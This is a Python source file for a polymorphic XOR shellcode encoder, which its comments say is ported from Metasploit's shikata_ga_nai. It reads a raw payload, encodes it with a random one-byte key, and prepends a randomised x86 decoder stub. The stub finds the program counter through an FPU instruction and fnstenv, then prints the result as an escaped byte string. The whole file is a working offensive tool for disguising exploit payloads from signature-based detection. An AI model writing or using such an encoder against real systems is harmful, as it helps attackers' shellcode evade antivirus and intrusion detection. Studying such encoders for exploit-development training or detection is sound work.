from keystone import *
import random

REGISTERS = list()

# Registers with 8 bit parts
REGISTERS.append({32: "EAX", 16: "AH", 8: "AL"})
REGISTERS.append({32: "EBX", 16: "BH", 8: "BL"})
REGISTERS.append({32: "ECX", 16: "CX", 8: "CL"})
REGISTERS.append({32: "EDX", 16: "DX", 8: "DL"})

# Registers withoutu 8 bit parts
REGISTERS.append({32: "ESI", 16: "SI"})
REGISTERS.append({32: "EDI", 16: "DI"})


def read_payload(path):
    """Read file as bytes"""
    with open(path, 'rb') as f:
        return f.read()


def assemble(code):
    """Assemble instructions"""

    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(code)

    return bytes(encoding)


def get_random_fpu_instruction():
    """Returns a random FPU instruction.

    Ported to python from metasploit's shikata_ga_nai.rb
    """

    fpu_opcodes = list()

    # D9E8 - D9 EE
    for opcode in range(0xe8, 0xee+1):
        fpu_opcodes.append(bytes([0xd9, opcode]))

    # D9C0 - D9CF
    for opcode in range(0xc0, 0xcf+1):
        fpu_opcodes.append(bytes([0xd9, opcode]))

    # DAC0 - DADF
    for opcode in range(0xc0, 0xdf+1):
        fpu_opcodes.append(bytes([0xda, opcode]))

    # DBC0 - DBDF
    for opcode in range(0xc0, 0xdf+1):
        fpu_opcodes.append(bytes([0xdb, opcode]))

    # DDC0 - DDC7
    for opcode in range(0xc0, 0xc7+1):
        fpu_opcodes.append(bytes([0xdd, opcode]))

    fpu_opcodes.append(bytes([0xd9, 0xd0]))
    fpu_opcodes.append(bytes([0xd9, 0xe1]))
    fpu_opcodes.append(bytes([0xd9, 0xf6]))
    fpu_opcodes.append(bytes([0xd9, 0xf7]))
    fpu_opcodes.append(bytes([0xd9, 0xe5]))

    return random.choice(fpu_opcodes)


def get_offset(limit=12):
    """Returns a random offset for the fnstenv location"""
    return random.randrange(0, limit)


def format_payload(payload):
    # readability out of the window

    return ''.join([f'\\x{payload[i:i+2]}' for i in range(0, len(payload), 2)])


def generate_random_byte():
    return random.randrange(0x01, 0xFF)


def get_random_register(size=32, exclude_regs=[]):
    """Returns a random register with a given size
    excluding the registers in the exclude_regs list
    """

    reg = random.choice(REGISTERS)

    if (size in reg):
        for reg_value in reg.values():
            if reg_value in exclude_regs:
                return get_random_register(size, exclude_regs)

        return reg.get(size)

    return get_random_register(size, exclude_regs)


def generate_pops(target_reg, exclude_regs=[], count=1, allow_dups=True):
    """Returns pop instructions ending with pop target_reg
    excluding registers in the exclude_regs list
    """

    random_regs = []

    for _ in range(0, count-1):
        random_reg = get_random_register(exclude_regs=exclude_regs)

        random_regs.append(random_reg)

    pops = ''

    for reg in random_regs:
        pops += f'pop {reg}; '

    pops += f'pop {target_reg}; '

    return pops


def generate_decoder_stub(payload_len, key):
    """Returns the decoder stuff which decodes the
    encoded payload.
    """

    # Calculate the offset of encoded payload
    # from the retrieved PC.
    # FPU instruction + fnstenv = 2 + 4 bytes
    offset_to_encoded_payload = 6

    # Offset for fnstenv to write on the stack
    # a little more polymorphism
    fnstenv_offset = get_offset()

    # instructions for the getPC routine
    get_pc_asm = ''
    # size 4 bytes
    get_pc_asm += f'fnstenv [esp-{hex(fnstenv_offset)}]; '

    # reg to save program counter
    pc_reg = get_random_register(exclude_regs=['ECX'])

    # if offset is 4 bytes aligned, use pops
    # instead of mov
    if (fnstenv_offset % 4 == 0):
        instructions_count = int((12 - fnstenv_offset)/4) + 1
        # size 1 byte each
        offset_to_encoded_payload += (instructions_count*1)

        get_pc_asm += generate_pops(pc_reg,
                                    exclude_regs=['ECX'],
                                    count=instructions_count)
    else:
        # else use mov

        # size 4 bytes
        offset_to_encoded_payload += 4
        get_pc_asm += f'mov {pc_reg}, [esp+{hex(12-fnstenv_offset)}]; '

    # register to save the one byte xor key
    xor_key_reg = get_random_register(size=8, exclude_regs=['CL', pc_reg])

    # xor decode instructions
    xor_asm = ''

    # if payload size can fit in one byte, use CL
    if (payload_len < 256):
        # size 2 bytes
        offset_to_encoded_payload += 2
        xor_asm += f'mov CL, {hex(payload_len)}; '
    else:
        # else use CX
        # size 4 bytes
        offset_to_encoded_payload += 4
        xor_asm += f'mov CX, {hex(payload_len)}; '

    # size of the next 4 instructions
    offset_to_encoded_payload += 8

    # size 2 bytes
    xor_asm += f'mov {xor_key_reg}, {hex(key)}; '
    xor_asm += 'decode: '
    # size 4 bytes
    # offset-1 because starts from 0
    xor_asm += f'xor [{pc_reg} + CL + {hex(offset_to_encoded_payload-1)}], {xor_key_reg}; '
    # size 2 bytes
    xor_asm += f'loop decode; '

    # assemble and return
    decoder_stub = b''
    decoder_stub += get_random_fpu_instruction()
    decoder_stub += assemble(get_pc_asm)
    decoder_stub += assemble(xor_asm)

    return decoder_stub


def encode_payload(payload, key):
    """Returns XOR encoded payload with the given key"""
    encoded_payload = b''
    for b in payload:
        encoded_payload += bytes([b ^ key])

    return encoded_payload


def encode(payload_path):
    payload = read_payload(payload_path)

    key = generate_random_byte()

    encoded_payload = encode_payload(payload, key)
    decoder_stub = generate_decoder_stub(len(payload), key)

    print(format_payload(decoder_stub.hex()))

    return decoder_stub + encoded_payload


print(format_payload(encode('./payload').hex()))
